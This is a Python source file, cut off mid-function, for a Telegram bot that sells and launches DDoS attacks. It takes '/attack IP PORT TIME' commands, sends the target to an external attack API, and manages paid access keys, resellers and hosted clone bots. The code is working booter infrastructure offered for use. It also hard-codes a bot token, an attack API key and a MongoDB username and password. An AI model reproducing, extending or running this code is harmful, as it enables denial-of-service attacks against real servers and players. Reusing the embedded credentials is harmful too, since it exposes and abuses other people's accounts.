#!/usr/bin/env python3
import telebot
import requests
import time
import threading
import json
import os
import random
import string
import re
from datetime import datetime, timedelta, timezone
from collections import defaultdict
from pymongo import MongoClient, UpdateOne

# ========== TIMEZONE (IST) ==========
IST = timezone(timedelta(hours=5, minutes=30))

def get_current_ist():
    return datetime.now(IST)

def format_ist_time(dt):
    return dt.strftime('%d %b %Y, %I:%M:%S %p')

# ========== ✅ BOLD UNICODE CONVERTER ==========
BOLD_MAP = {
    'A': '𝗔', 'B': '𝗕', 'C': '𝗖', 'D': '𝗗', 'E': '𝗘', 'F': '𝗙', 'G': '𝗚',
    'H': '𝗛', 'I': '𝗜', 'J': '𝗝', 'K': '𝗞', 'L': '𝗟', 'M': '𝗠', 'N': '𝗡',
    'O': '𝗢', 'P': '𝗣', 'Q': '𝗤', 'R': '𝗥', 'S': '𝗦', 'T': '𝗧', 'U': '𝗨',
    'V': '𝗩', 'W': '𝗪', 'X': '𝗫', 'Y': '𝗬', 'Z': '𝗭',
    'a': '𝗮', 'b': '𝗯', 'c': '𝗰', 'd': '𝗱', 'e': '𝗲', 'f': '𝗳', 'g': '𝗴',
    'h': '𝗵', 'i': '𝗶', 'j': '𝗷', 'k': '𝗸', 'l': '𝗹', 'm': '𝗺', 'n': '𝗻',
    'o': '𝗼', 'p': '𝗽', 'q': '𝗾', 'r': '𝗿', 's': '𝘀', 't': '𝘁', 'u': '𝘂',
    'v': '𝘃', 'w': '𝘄', 'x': '𝘅', 'y': '𝘆', 'z': '𝘇',
    '0': '𝟬', '1': '𝟭', '2': '𝟮', '3': '𝟯', '4': '𝟰', '5': '𝟱', '6': '𝟲',
    '7': '𝟳', '8': '𝟴', '9': '𝟵'
}

def bold(text):
    """Convert text to Unicode bold characters"""
    return ''.join(BOLD_MAP.get(c, c) for c in str(text))

# ========== STYLED MESSAGE FUNCTION (BOLD TITLE) ==========
def styled_msg(title, content, status="info"):
    if status == "success":
        icon = "✅"
    elif status == "error":
        icon = "❌"
    elif status == "warning":
        icon = "⚠️"
    elif status == "attack":
        icon = "🔥"
    else:
        icon = "📌"
    
    # ✅ Bold the title
    bold_title = bold(title)
    
    msg = f"""
┌{'─' * 45}┐
│ {icon} {bold_title}
├{'─' * 45}┤
{content}
└{'─' * 45}┘"""
    return msg

# ========== CONFIG ==========
BOT_TOKEN = "8760406918:AAGtzPJ2giDXmWgmyP4TRo82IrvQ5EyRbcA"
ADMIN_ID = ["8487946379"]

# ✅ NEW API CONFIG
API_URL = "https://delvorn.vynqo.in/api/attack/start"
API_KEY = "Delvorn_Core_QB1HNAVO"
MAX_CONCURRENT = 2
COOLDOWN_TIME = 30

# ✅ AUTO-DELETE CONFIG (seconds)
AUTO_DELETE_FINISH = 30
AUTO_DELETE_LAUNCH = "duration"

# ========== MONGODB ==========
MONGO_URI = "mongodb+srv://mohitrao83076_db_user:LugF1xwlenkWRE1F@monster.ydmmckl.mongodb.net/?retryWrites=true&w=majority&appName=MONSTER"
client = MongoClient(MONGO_URI)
db = client["xsilent_bot"]

users_collection = db["users"]
keys_collection = db["keys"]
groups_collection = db["groups"]
hosted_bots_collection = db["hosted_bots"]
settings_collection = db["settings"]
broadcast_users_collection = db["broadcast_users"]

print("✅ MongoDB Connected Successfully!")

# ========== MONGO INDEXES ==========
print("🔧 Creating MongoDB indexes...")
try:
    keys_collection.create_index("key", unique=True)
    keys_collection.create_index("used_by")
    keys_collection.create_index("generated_by")
    keys_collection.create_index("used")
    hosted_bots_collection.create_index("bot_token", unique=True)
    groups_collection.create_index("group_id", unique=True)
    print("✅ Indexes ready!")
except Exception as e:
    print(f"⚠️ Index warning: {e}")

print(f"📅 Server Time: {format_ist_time(get_current_ist())}")

# ========== DATA STRUCTURES ==========
active_attacks = {}
cooldown = {}
hosted_bots = {}
hosted_bot_instances = {}
maintenance_mode = False

# ========== FAST SAVE FUNCTIONS ==========
def load_users():
    users_data = users_collection.find_one({"_id": "users"})
    if not users_data:
        users_collection.insert_one({"_id": "users", "users": [ADMIN_ID[0]], "resellers": []})
        return {"users": [ADMIN_ID[0]], "resellers": []}
    return users_data

def save_users(data):
    users_collection.update_one({"_id": "users"}, {"$set": data}, upsert=True)

def load_keys():
    keys = {}
    for key_data in keys_collection.find():
        keys[key_data["key"]] = {
            "user_id": key_data.get("user_id"),
            "duration_value": key_data.get("duration_value"),
            "duration_unit": key_data.get("duration_unit"),
            "generated_by": key_data.get("generated_by"),
            "generated_at": key_data.get("generated_at"),
            "expires_at": key_data.get("expires_at"),
            "used": key_data.get("used", False),
            "used_by": key_data.get("used_by"),
            "used_at": key_data.get("used_at")
        }
    return keys

def save_keys(keys_data):
    try:
        existing = set(doc["key"] for doc in keys_collection.find({}, {"key": 1}))
        new_keys = set(keys_data.keys())
        
        to_delete = existing - new_keys
        if to_delete:
            keys_collection.delete_many({"key": {"$in": list(to_delete)}})
        
        if keys_data:
            ops = []
            for key, info in keys_data.items():
                ops.append(UpdateOne(
                    {"key": key},
                    {"$set": {
                        "key": key,
                        "user_id": info.get("user_id"),
                        "duration_value": info.get("duration_value"),
                        "duration_unit": info.get("duration_unit"),
                        "generated_by": info.get("generated_by"),
                        "generated_at": info.get("generated_at"),
                        "expires_at": info.get("expires_at"),
                        "used": info.get("used", False),
                        "used_by": info.get("used_by"),
                        "used_at": info.get("used_at")
                    }},
                    upsert=True
                ))
            if ops:
                keys_collection.bulk_write(ops, ordered=False)
    except Exception as e:
        print(f"⚠️ save_keys error: {e}")

def load_groups():
    groups = {}
    for group_data in groups_collection.find():
        groups[group_data["group_id"]] = {
            "attack_time": group_data.get("attack_time", 60),
            "added_by": group_data.get("added_by"),
            "added_at": group_data.get("added_at")
        }
    return groups

def save_groups(groups_data):
    try:
        existing = set(doc["group_id"] for doc in groups_collection.find({}, {"group_id": 1}))
        new_ids = set(groups_data.keys())
        
        to_delete = existing - new_ids
        if to_delete:
            groups_collection.delete_many({"group_id": {"$in": list(to_delete)}})
        
        if groups_data:
            ops = []
            for group_id, info in groups_data.items():
                ops.append(UpdateOne(
                    {"group_id": group_id},
                    {"$set": {
                        "group_id": group_id,
                        "attack_time": info.get("attack_time"),
                        "added_by": info.get("added_by"),
                        "added_at": info.get("added_at")
                    }},
                    upsert=True
                ))
            if ops:
                groups_collection.bulk_write(ops, ordered=False)
    except Exception as e:
        print(f"⚠️ save_groups error: {e}")

def load_hosted_bots():
    bots = {}
    for bot_data in hosted_bots_collection.find():
        bots[bot_data["bot_token"]] = {
            "owner_id": bot_data.get("owner_id"),
            "owner_name": bot_data.get("owner_name"),
            "concurrent": bot_data.get("concurrent", 1),
            "blocked": bot_data.get("blocked", False),
            "active_attacks": {},
            "users": bot_data.get("users", []),
            "resellers": bot_data.get("resellers", [])
        }
    return bots

def save_hosted_bots(bots_data):
    try:
        existing = set(doc["bot_token"] for doc in hosted_bots_collection.find({}, {"bot_token": 1}))
        new_tokens = set(bots_data.keys())
        
        to_delete = existing - new_tokens
        if to_delete:
            hosted_bots_collection.delete_many({"bot_token": {"$in": list(to_delete)}})
        
        if bots_data:
            ops = []
            for bot_token, info in bots_data.items():
                ops.append(UpdateOne(
                    {"bot_token": bot_token},
                    {"$set": {
                        "bot_token": bot_token,
                        "owner_id": info.get("owner_id"),
                        "owner_name": info.get("owner_name"),
                        "concurrent": info.get("concurrent", 1),
                        "blocked": info.get("blocked", False),
                        "users": info.get("users", []),
                        "resellers": info.get("resellers", [])
                    }},
                    upsert=True
                ))
            if ops:
                hosted_bots_collection.bulk_write(ops, ordered=False)
    except Exception as e:
        print(f"⚠️ save_hosted_bots error: {e}")

def load_settings():
    settings = settings_collection.find_one({"_id": "settings"})
    if not settings:
        settings_collection.insert_one({"_id": "settings", "max_concurrent": 2, "cooldown": 30})
        return {"max_concurrent": 2, "cooldown": 30}
    return settings

def save_settings(settings):
    settings_collection.update_one({"_id": "settings"}, {"$set": settings}, upsert=True)

def load_broadcast_users():
    broadcast_data = broadcast_users_collection.find_one({"_id": "broadcast_users"})
    if not broadcast_data:
        broadcast_users_collection.insert_one({"_id": "broadcast_users", "users": []})
        return {"users": []}
    return broadcast_data

def save_broadcast_users(data):
    broadcast_users_collection.update_one({"_id": "broadcast_users"}, {"$set": data}, upsert=True)

# ========== LOAD DATA ==========
users_data = load_users()
users = users_data["users"]
resellers = users_data.get("resellers", [])
keys_data = load_keys()
groups = load_groups()
hosted_bots = load_hosted_bots()
settings = load_settings()
broadcast_data = load_broadcast_users()
broadcast_users = broadcast_data.get("users", [])

MAX_CONCURRENT = settings.get("max_concurrent", 2)
COOLDOWN_TIME = settings.get("cooldown", 30)

bot = telebot.TeleBot(BOT_TOKEN)

# ========== AUTO-HIGHLIGHT WRAPPER ==========
_original_reply_to = bot.reply_to
_original_send_message = bot.send_message

def _is_styled(text):
    if not isinstance(text, str):
        return False
    s = text.strip()
    return s.startswith("┌") or s.startswith("╔")

def _wrap_text(text, title="REPLY"):
    lines = text.split('\n')
    body = '\n'.join(f"│ {line}" for line in lines)
    return styled_msg(title, body)

def styled_reply_to_wrapper(msg, text, *args, **kwargs):
    if kwargs.get('parse_mode'):
        return _original_reply_to(msg, text, *args, **kwargs)
    if _is_styled(text):
        return _original_reply_to(msg, text, *args, **kwargs)
    if isinstance(text, str):
        return _original_reply_to(msg, _wrap_text(text), *args, **kwargs)
    return _original_reply_to(msg, text, *args, **kwargs)

def styled_send_message_wrapper(chat_id, text, *args, **kwargs):
    if kwargs.get('parse_mode'):
        return _original_send_message(chat_id, text, *args, **kwargs)
    if _is_styled(text):
        return _original_send_message(chat_id, text, *args, **kwargs)
    if isinstance(text, str):
        return _original_send_message(chat_id, _wrap_text(text, "MESSAGE"), *args, **kwargs)
    return _original_send_message(chat_id, text, *args, **kwargs)

bot.reply_to = styled_reply_to_wrapper
bot.send_message = styled_send_message_wrapper

# ========== HELPER FUNCTIONS ==========
def check_maintenance():
    return maintenance_mode

def generate_key():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))

def parse_duration(duration_str):
    duration_str = duration_str.lower().strip()
    if duration_str.isdigit():
        return int(duration_str), "day"
    if duration_str.endswith('h'):
        hours = duration_str.replace('h', '')
        if hours.isdigit():
            return int(hours), "hour"
    return None, None

def get_expiry_date(value, unit):
    now_ist = get_current_ist()
    if unit == "hour":
        return now_ist + timedelta(hours=value)
    return now_ist + timedelta(days=value)

def format_duration(value, unit):
    if unit == "hour":
        return f"{value} Hour(s)"
    return f"{value} Day(s)"

def auto_delete_message(bot_instance, chat_id, message_id, delay):
    if not delay or delay <= 0:
        return
    def _delete():
        time.sleep(delay)
        try:
            bot_instance.delete_message(chat_id, message_id)
        except:
            pass
    threading.Thread(target=_delete, daemon=True).start()

def get_total_active_count():
    now = time.time()
    for attack_id, info in list(active_attacks.items()):
        if now >= info["finish_time"]:
            del active_attacks[attack_id]
    for token, bot_info in hosted_bots.items():
        for attack_id, info in list(bot_info.get("active_attacks", {}).items()):
            if now >= info["finish_time"]:
                del bot_info["active_attacks"][attack_id]
    main_count = len(active_attacks)
    hosted_count = sum(len(b.get("active_attacks", {})) for b in hosted_bots.values())
    return main_count + hosted_count

def check_active_attack_by_target(ip, port):
    target_key = f"{ip}:{port}"
    now = time.time()
    for attack_id, attack_info in list(active_attacks.items()):
        if attack_info["target_key"] == target_key:
            if now < attack_info["finish_time"]:
                return attack_info
            else:
                del active_attacks[attack_id]
                return None
    return None

def check_user_expiry(user_id):
    now = time.time()
    for key, info in keys_data.items():
        if info.get("used_by") == user_id and info.get("used") == True and now < info["expires_at"]:
            return True
    return False

def stop_hosted_bot(bot_token):
    try:
        if bot_token in hosted_bot_instances:
            try:
                hosted_bot_instances[bot_token].stop_polling()
            except:
                pass
            del hosted_bot_instances[bot_token]
        if bot_token in hosted_bots:
            del hosted_bots[bot_token]
        save_hosted_bots(hosted_bots)
        return True
    except:
        return False

def validate_ip(ip):
    pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    if re.match(pattern, ip):
        parts = ip.split('.')
        for part in parts:
            if int(part) < 0 or int(part) > 255:
                return False
        return True
    return False

# ========== NEW API ATTACK FUNCTION ==========
def send_attack_to_api(ip, port, duration, chat_id, bot_instance, is_hosted=False):
    try:
        api_params = {
            "key": API_KEY,
            "ip": ip,
            "port": port,
            "time": duration
        }
        
        response = requests.get(API_URL, params=api_params, timeout=15)
        
        if response.status_code == 200:
            try:
                resp_data = response.json()
                api_ok = resp_data.get("success", True)
                api_msg = resp_data.get("message", "Attack started")
            except:
                api_ok = True
                api_msg = "Attack started"
            
            if api_ok:
                def notify_finish():
                    finish_time = format_ist_time(get_current_ist())
                    msg = styled_msg(
                        "ATTACK FINISHED",
                        f"│ 🎯 Target: {ip}:{port}\n"
                        f"│ ⏱️ Duration: {duration}s\n"
                        f"│ 📅 Finished: {finish_time}\n"
                        f"│ 🔄 Restart your game!\n"
                        f"│ 🗑️ Auto-delete in {AUTO_DELETE_FINISH}s",
                        "success"
                    )
                    try:
                        sent = bot_instance.send_message(chat_id, msg)
                        auto_delete_message(bot_instance, chat_id, sent.message_id, AUTO_DELETE_FINISH)
                    except:
                        pass
                
                threading.Timer(duration, notify_finish).start()
                return True
            else:
                msg = styled_msg(
                    "ATTACK FAILED",
                    f"│ 🎯 Target: {ip}:{port}\n"
                    f"│ 📡 API: {api_msg}\n"
                    f"│ 💡 Try again later!",
                    "error"
                )
                try:
                    sent = bot_instance.send_message(chat_id, msg)
                    auto_delete_message(bot_instance, chat_id, sent.message_id, AUTO_DELETE_FINISH)
                except:
                    pass
                return False
        else:
            msg = styled_msg(
                "ATTACK FAILED",
                f"│ 🎯 Target: {ip}:{port}\n"
                f"│ 📡 Status: {response.status_code}\n"
                f"│ 💡 Try again later!",
                "error"
            )
            try:
                sent = bot_instance.send_message(chat_id, msg)
                auto_delete_message(bot_instance, chat_id, sent.message_id, AUTO_DELETE_FINISH)
            except:
                pass
            return False
            
    except Exception as e:
        msg = styled_msg(
            "ATTACK ERROR",
            f"│ 🎯 Target: {ip}:{port}\n"
            f"│ ⚠️ Error: {str(e)[:40]}\n"
            f"│ 📞 Contact Admin!",
            "error"
        )
        try:
            sent = bot_instance.send_message(chat_id, msg)
            auto_delete_message(bot_instance, chat_id, sent.message_id, AUTO_DELETE_FINISH)
        except:
            pass
        return False

# ========== EXPIRY CLEANUP ==========
def process_expired_keys(is_startup=False):
    try:
        now = time.time()
        expired_keys = []
        
        for key, info in list(keys_data.items()):
            if info.get("used", False) and now > info["expires_at"]:
                expired_keys.append(key)
        
        for key in expired_keys:
            key_info = keys_data.get(key)
            if not key_info:
                continue
            
            user_id = key_info.get("used_by")
            if not user_id:
                del keys_data[key]
                continue
            
            has_other = False
            for k, v in keys_data.items():
                if k == key:
                    continue
                if (v.get("used_by") == user_id and 
                    v.get("used", False) and 
                    now < v.get("expires_at", 0)):
                    has_other = True
                    break
            
            del keys_data[key]
            
            if not has_other and user_id not in ADMIN_ID:
                if user_id in users:
                    users.remove(user_id)
                    users_data["users"] = users
                    save_users(users_data)
                
                try:
                    expiry_str = datetime.fromtimestamp(
                        key_info['expires_at'], tz=IST
                    ).strftime('%d %b %Y, %I:%M %p')
                    
                    duration_str = format_duration(
                        key_info.get('duration_value', 1),
                        key_info.get('duration_unit', 'day')
                    )
                    
                    content = (
                        f"│ ⚠️ Your access has EXPIRED!\n"
                        f"│\n"
                        f"│ 🔑 Key: <code>{key}</code>\n"
                        f"│ ⏰ Duration was: {duration_str}\n"
                        f"│ 📅 Expired at: {expiry_str}\n"
                        f"│\n"
                        f"│ 🛒 Get a new key from admin:\n"
                        f"│ 📞 Contact Admin\n"
                        f"│\n"
                        f"│ 💡 Use /redeem KEY to activate"
                    )
                    
                    bot.send_message(
                        user_id,
                        styled_msg("ACCESS EXPIRED", content, "warning"),
                        parse_mode="HTML"
                    )
                    print(f"✅ Expiry notification sent to {user_id}")
                except Exception as e:
                    print(f"⚠️ Notify {user_id} failed: {e}")
        
        if expired_keys:
            save_keys(keys_data)
            print(f"🗑️ {'Startup' if is_startup else 'Cleanup'}: Removed {len(expired_keys)} keys")
    
    except Exception as e:
        print(f"⚠️ process_expired error: {e}")


def cleanup_expired_keys():
    while True:
        time.sleep(30)
        process_expired_keys(is_startup=False)


def startup_expiry_check():
    print("🔍 Checking expired keys at startup...")
    time.sleep(5)
    process_expired_keys(is_startup=True)


def warning_expiry_notifier():
    warned_keys = set()
    
    while True:
        time.sleep(60)
        
        try:
            now = time.time()
            warning_window = 5 * 60
            
            for key, info in list(keys_data.items()):
                if not info.get("used", False):
                    continue
                if key in warned_keys:
                    continue
                
                expires_at = info.get("expires_at", 0)
                time_left = expires_at - now
                
                if 0 < time_left <= warning_window and time_left > (warning_window - 60):
                    user_id = info.get("used_by")
                    if not user_id or user_id in ADMIN_ID:
                        continue
                    
                    try:
                        minutes_left = int(time_left / 60)
                        seconds_left = int(time_left % 60)
                        
                        content = (
                            f"│ ⏰ Your access expires soon!\n"
                            f"│\n"
                            f"│ 🔑 Key: <code>{key}</code>\n"
                            f"│ ⏱️ Time left: {minutes_left}m {seconds_left}s\n"
                            f"│\n"
                            f"│ 💡 Get a new key before expiry\n"
                            f"│ 📞 Contact Admin"
                        )
                        
                        bot.send_message(
                            user_id,
                            styled_msg("EXPIRY WARNING", content, "warning"),
                            parse_mode="HTML"
                        )
                        warned_keys.add(key)
                        print(f"⚠️ Warning sent to {user_id}")
                    except Exception as e:
                        print(f"⚠️ Warning fail {user_id}: {e}")
        
        except Exception as e:
            print(f"⚠️ Warning thread error: {e}")


expiry_cleanup_thread = threading.Thread(target=cleanup_expired_keys, daemon=True)
expiry_cleanup_thread.start()

warning_thread = threading.Thread(target=warning_expiry_notifier, daemon=True)
warning_thread.start()

startup_check_thread = threading.Thread(target=startup_expiry_check, daemon=True)
startup_check_thread.start()


def attack_cleanup():
    while True:
        time.sleep(5)
        now = time.time()
        for attack_id, info in list(active_attacks.items()):
            if now >= info["finish_time"]:
                del active_attacks[attack_id]
        for token, bot_info in hosted_bots.items():
            for attack_id, info in list(bot_info.get("active_attacks", {}).items()):
                if now >= info["finish_time"]:
                    del bot_info["active_attacks"][attack_id]

attack_cleanup_thread = threading.Thread(target=attack_cleanup, daemon=True)
attack_cleanup_thread.start()

# ========== HOSTED BOT FUNCTION ==========
def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
    try:
        print(f"🔄 Starting hosted bot...")
        
        if bot_token in hosted_bot_instances:
            try:
                hosted_bot_instances[bot_token].stop_polling()
                time.sleep(1)
            except:
                pass
            del hosted_bot_instances[bot_token]
        
        test_bot = telebot.TeleBot(bot_token)
        test_bot.remove_webhook()
        time.sleep(2)
        bot_info = test_bot.get_me()
        print(f"✅ Hosted bot @{bot_info.username} is valid")
        
        hosted_bot = telebot.TeleBot(bot_token)
        hosted_bot_instances[bot_token] = hosted_bot
        hosted_cooldown_data = {}
        
        # Style helper with bold
        def hstyled(title, content, status="info"):
            if status == "success":
                icon = "✅"
            elif status == "error":
                icon = "❌"
            elif status == "attack":
                icon = "🔥"
            else:
                icon = "📌"
            bold_title = bold(title)
            return f"""
┌{'─' * 40}┐
│ {icon} {bold_title}
├{'─' * 40}┤
{content}
└{'─' * 40}┘"""
        
        # Hosted bot auto-highlight wrapper
        _h_orig_reply = hosted_bot.reply_to
        _h_orig_send = hosted_bot.send_message
        
        def _h_is_styled(text):
            if not isinstance(text, str):
                return False
            s = text.strip()
            return s.startswith("┌") or s.startswith("╔")
        
        def _h_wrap(text, title="REPLY"):
            lines = text.split('\n')
            body = '\n'.join(f"│ {line}" for line in lines)
            return hstyled(title, body)
        
        def _h_styled_reply(msg, text, *args, **kwargs):
            if kwargs.get('parse_mode'):
                return _h_orig_reply(msg, text, *args, **kwargs)
            if _h_is_styled(text):
                return _h_orig_reply(msg, text, *args, **kwargs)
            if isinstance(text, str):
                return _h_orig_reply(msg, _h_wrap(text), *args, **kwargs)
            return _h_orig_reply(msg, text, *args, **kwargs)
        
        def _h_styled_send(chat_id, text, *args, **kwargs):
            if kwargs.get('parse_mode'):
                return _h_orig_send(chat_id, text, *args, **kwargs)
            if _h_is_styled(text):
                return _h_orig_send(chat_id, text, *args, **kwargs)
            if isinstance(text, str):
                return _h_orig_send(chat_id, _h_wrap(text, "MESSAGE"), *args, **kwargs)
            return _h_orig_send(chat_id, text, *args, **kwargs)
        
        hosted_bot.reply_to = _h_styled_reply
        hosted_bot.send_message = _h_styled_send
        
        @hosted_bot.message_handler(commands=['start'])
        def hosted_start(msg):
            current_time = format_ist_time(get_current_ist())
            content = f"│ 👑 Owner: {owner_name}\n│ ✅ Status: Active\n│ ⚡ Concurrent: {concurrent}\n│ ⏱️ Max Time: 300s\n│ 📅 {current_time}\n│\n│ 📝 {bold('COMMANDS')}:\n│ /attack IP PORT TIME\n│ /status\n│ /cooldown\n│ /redeem KEY\n│ /help"
            hosted_bot.reply_to(msg, hstyled("DDOS BOT", content, "attack"))
        
        @hosted_bot.message_handler(commands=['help'])
        def hosted_help(msg):
            uid = str(msg.chat.id)
            current_time = format_ist_time(get_current_ist())
            if uid == owner_id:
                content = f"│ 👑 {bold('OWNER COMMANDS')}\n│\n│ /attack IP PORT TIME\n│ /status\n│ /cooldown\n│ /second 10-300\n│ /genkey 1 or 5h\n│ /mykeys\n│ /removekey KEY\n│ /addgroup ID TIME\n│ /removegroup ID\n│ /addreseller ID\n│ /removereseller ID\n│ /broadcast\n│ 📅 {current_time}"
                hosted_bot.reply_to(msg, hstyled("OWNER HELP", content))
            elif uid in resellers:
                content = f"│ 💎 {bold('RESELLER COMMANDS')}\n│\n│ /attack IP PORT TIME\n│ /status\n│ /cooldown\n│ /genkey 1 or 5h\n│ /mykeys\n│ 📅 {current_time}"
                hosted_bot.reply_to(msg, hstyled("RESELLER HELP", content))
            elif uid in users:
                if check_user_expiry(uid):
                    content = f"│ 🔥 {bold('USER COMMANDS')}\n│\n│ /attack IP PORT TIME\n│ /status\n│ /cooldown\n│ /redeem KEY\n│ 📅 {current_time}"
                    hosted_bot.reply_to(msg, hstyled("USER HELP", content))
                else:
                    content = f"│ ⚠️ {bold('ACCESS EXPIRED')}\n│\n│ Use /redeem KEY to activate\n│ 📅 {current_time}"
                    hosted_bot.reply_to(msg, hstyled("HELP", content, "warning"))
            else:
                content = f"│ ❌ {bold('UNAUTHORIZED')}\n│\n│ Use /redeem KEY to activate\n│ 📅 {current_time}"
                hosted_bot.reply_to(msg, hstyled("HELP", content, "error"))
        
        @hosted_bot.message_handler(commands=['cooldown'])
        def hosted_cooldown(msg):
            uid = str(msg.chat.id)
            if uid in hosted_cooldown_data:
                remaining = hosted_cooldown_data[uid] - time.time()
                if remaining > 0:
                    hosted_bot.reply_to(msg, f"⏳ Cooldown: {int(remaining)}s remaining!")
                else:
                    del hosted_cooldown_data[uid]
                    hosted_bot.reply_to(msg, "✅ No cooldown! You can attack now.")
            else:
                hosted_bot.reply_to(msg, "✅ No cooldown! You can attack now.")
        
        @hosted_bot.message_handler(commands=['addgroup'])
        def hosted_add_group(msg):
            uid = str(msg.chat.id)
            if uid != owner_id:
                hosted_bot.reply_to(msg, "❌ Only bot owner can add groups!")
                return
            args = msg.text.split()
            if len(args) != 3:
                hosted_bot.reply_to(msg, "⚠️ Usage: /addgroup GROUP_ID TIME")
                return
            group_id = args[1]
            try:
                attack_time = int(args[2])
                if attack_time < 10 or attack_time > 300:
                    hosted_bot.reply_to(msg, "❌ Attack time 10-300 seconds!")
                    return
            except:
                hosted_bot.reply_to(msg, "❌ Invalid time!")
                return
            groups[group_id] = {"attack_time": attack_time, "added_by": uid, "added_at": time.time()}
            save_groups(groups)
            hosted_bot.reply_to(msg, f"✅ GROUP ADDED!\n👥 Group ID: {group_id}\n⏱️ Attack Time: {attack_time}s")
        
        @hosted_bot.message_handler(commands=['removegroup'])
        def hosted_remove_group(msg):
            uid = str(msg.chat.id)
            if uid != owner_id:
                hosted_bot.reply_to(msg, "❌ Only bot owner can remove groups!")
                return
            args = msg.text.split()
            if len(args) != 2:
                hosted_bot.reply_to(msg, "⚠️ Usage: /removegroup GROUP_ID")
                return
            group_id = args[1]
            if group_id in groups:
                del groups[group_id]
                save_groups(groups)
                hosted_bot.reply_to(msg, f"✅ GROUP REMOVED!\n👥 {group_id}")
            else:
                hosted_bot.reply_to(msg, "❌ Group not found!")
        
        @hosted_bot.message_handler(commands=['removekey'])
        def hosted_remove_key(msg):
            uid = str(msg.chat.id)
            if uid != owner_id:
                hosted_bot.reply_to(msg, "❌ Only bot owner!")
                return
            args = msg.text.split()
            if len(args) != 2:
                hosted_bot.reply_to(msg, "⚠️ Usage: /removekey KEY")
                return
            key = args[1]
            if key not in keys_data:
                hosted_bot.reply_to(msg, "❌ Key not found!")
                return
            del keys_data[key]
            save_keys(keys_data)
            hosted_bot.reply_to(msg, f"✅ KEY REMOVED!\n🔑 {key}")
        
        @hosted_bot.message_handler(commands=['addreseller'])
        def hosted_add_reseller(msg):
            uid = str(msg.chat.id)
            if uid != owner_id:
                hosted_bot.reply_to(msg, "❌ Only bot owner!")
                return
            args = msg.text.split()
            if len(args) != 2:
                hosted_bot.reply_to(msg, "⚠️ Usage: /addreseller USER_ID")
                return
            new_reseller = args[1]
            if new_reseller not in resellers:
                resellers.append(new_reseller)
                users_data["resellers"] = resellers
                save_users(users_data)
                hosted_bot.reply_to(msg, f"✅ RESELLER ADDED!\n👤 {new_reseller}")
            else:
                hosted_bot.reply_to(msg, "❌ Already a reseller!")
        
        @hosted_bot.message_handler(commands=['removereseller'])
        def hosted_remove_reseller(msg):
            uid = str(msg.chat.id)
            if uid != owner_id:
                hosted_bot.reply_to(msg, "❌ Only bot owner!")
                return
            args = msg.text.split()
            if len(args) != 2:
                hosted_bot.reply_to(msg, "⚠️ Usage: /removereseller USER_ID")
                return
            target = args[1]
            if target in resellers:
                resellers.remove(target)
                users_data["resellers"] = resellers
                save_users(users_data)
                hosted_bot.reply_to(msg, f"✅ RESELLER REMOVED!\n👤 {target}")
            else:
                hosted_bot.reply_to(msg, "❌ Not a reseller!")
        
        @hosted_bot.message_handler(commands=['genkey'])
        def hosted_genkey(msg):
            uid = str(msg.chat.id)
            is_reseller = uid in resellers
            if uid != owner_id and not is_reseller:
                hosted_bot.reply_to(msg, "❌ Owner or Reseller only!")
                return
            args = msg.text.split()
            if len(args) != 2:
                hosted_bot.reply_to(msg, "⚠️ Usage: /genkey 1 or /genkey 5h")
                return
            value, unit = parse_duration(args[1])
            if value is None:
                hosted_bot.reply_to(msg, "❌ Invalid duration! Use 1 or 5h")
                return
            key = generate_key()
            expires_at = get_expiry_date(value, unit)
            keys_data[key] = {"user_id": "pending", "duration_value": value, "duration_unit": unit, "generated_by": uid, "generated_at": time.time(), "expires_at": expires_at.timestamp(), "used": False}
            save_keys(keys_data)
            expiry_str = expires_at.strftime('%d %b %Y, %I:%M %p')
            content = (
                f"│ 🔑 {bold('Key')}:\n"
                f"│ <code>{key}</code>\n"
                f"│\n"
                f"│ ⏰ Duration: {format_duration(value, unit)}\n"
                f"│ 📅 Expires: {expiry_str}\n"
                f"│\n"
                f"│ 👆 Tap key to copy!"
            )
            hosted_bot.reply_to(msg, hstyled("KEY GENERATED", content, "success"), parse_mode="HTML")
        
        @hosted_bot.message_handler(commands=['mykeys'])
        def hosted_mykeys(msg):
            uid = str(msg.chat.id)
            if uid != owner_id:
                hosted_bot.reply_to(msg, "❌ Only bot owner!")
                return
            my_keys = []
            for key, info in keys_data.items():
                if info.get("generated_by") == uid and not info.get("used", False):
                    expires = datetime.fromtimestamp(info["expires_at"], tz=IST).strftime('%d %b %Y, %I:%M %p')
                    my_keys.append(
                        f"│ 🔑 <code>{key}</code>\n"
                        f"│    ⏰ {format_duration(info['duration_value'], info['duration_unit'])}\n"
                        f"│    📅 {expires}"
                    )
            if my_keys:
                body = "\n│\n".join(my_keys)
                content = f"{body}\n│\n│ 👆 Tap key to copy!"
                hosted_bot.reply_to(msg, hstyled("YOUR KEYS", content, "success"), parse_mode="HTML")
            else:
                hosted_bot.reply_to(msg, "📋 No keys generated yet!")
        
        @hosted_bot.message_handler(commands=['second'])
        def hosted_second(msg):
            uid = str(msg.chat.id)
            if uid != owner_id:
                hosted_bot.reply_to(msg, "❌ Only bot owner!")
                return
            args = msg.text.split()
            if len(args) != 2:
                hosted_bot.reply_to(msg, "⚠️ Usage: /second 10-300")
                return
            try:
                new_max = int(args[1])
                if new_max < 10 or new_max > 300:
                    hosted_bot.reply_to(msg, "❌ Value 10-300 seconds!")
                    return
                hosted_bots[bot_token]["max_time"] = new_max
                save_hosted_bots(hosted_bots)
                hosted_bot.reply_to(msg, f"✅ Max attack time: {new_max}s")
            except:
                hosted_bot.reply_to(msg, "❌ Invalid number!")
        
        @hosted_bot.message_handler(commands=['broadcast'])
        def hosted_broadcast(msg):
            uid = str(msg.chat.id)
            if uid != owner_id:
                hosted_bot.reply_to(msg, "❌ Only bot owner can broadcast!")
                return
            
            if not msg.reply_to_message:
                hosted_bot.reply_to(msg, hstyled(
                    "BROADCAST USAGE",
                    f"│ 📌 Reply to any message (photo/video/text)\n"
                    f"│ and send /broadcast\n"
                    f"│ Message will be sent as-is!",
                    "warning"
                ))
                return
            
            user_list = hosted_bots.get(bot_token, {}).get("users", [])
            if not user_list:
                hosted_bot.reply_to(msg, "📋 No users to broadcast!")
                return
            
            replied = msg.reply_to_message
            success = 0
            fail = 0
            
            for user in user_list:
                try:
                    hosted_bot.copy_message(
                        chat_id=user,
                        from_chat_id=msg.chat.id,
                        message_id=replied.message_id
                    )
                    success += 1
                except:
                    fail += 1
            
            hosted_bot.reply_to(msg, hstyled(
                "BROADCAST SENT",
                f"│ ✅ Success: {success}\n"
